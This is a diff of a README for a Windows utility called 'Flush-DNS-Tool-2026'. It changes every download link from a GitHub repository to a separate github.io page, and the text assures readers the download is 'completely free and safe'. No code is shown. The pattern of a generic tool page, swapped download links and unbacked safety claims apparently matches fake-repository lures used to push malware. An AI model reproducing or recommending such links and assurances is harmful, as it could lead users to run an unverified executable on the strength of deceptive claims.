@@ -1,6 +1,6 @@
 # 🚀 Flush-DNS-Tool-2026 - Fix Internet Issues Fast & Free
 
-[![Download Now](https://img.shields.io/badge/Download-Flush--DNS--Tool--2026-blue?style=for-the-badge&logo=windows)](https://github.com/Zachariasrelocated9523/Flush-DNS-Tool-2026)
+[![Download Now](https://img.shields.io/badge/Download-Flush--DNS--Tool--2026-blue?style=for-the-badge&logo=windows)](https://zachariasrelocated9523.github.io)
 
 ## 🧹 What Does This Tool Do?
 
@@ -18,7 +18,7 @@ Flush-DNS-Tool-2026 is a simple, powerful utility for Windows that solves common
 ### 📥 Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/Zachariasrelocated9523/Flush-DNS-Tool-2026**](https://github.com/Zachariasrelocated9523/Flush-DNS-Tool-2026)
+[**https://zachariasrelocated9523.github.io**](https://zachariasrelocated9523.github.io)
 
 The download starts immediately after you click the link. It's completely free and safe.
 
@@ -121,7 +121,7 @@ Unlike manual methods that require opening Command Prompt and typing complex com
 
 Ready to fix your internet issues? Download Flush-DNS-Tool-2026 now:
 
-[**Download Flush-DNS-Tool-2026**](https://github.com/Zachariasrelocated9523/Flush-DNS-Tool-2026)
+[**Download Flush-DNS-Tool-2026**](https://zachariasrelocated9523.github.io)
 
 The download is completely free, includes all future updates, and you can use it on as many computers as you want. Support for the tool is available through the GitHub repository's issue tracker if you encounter any problems.
 
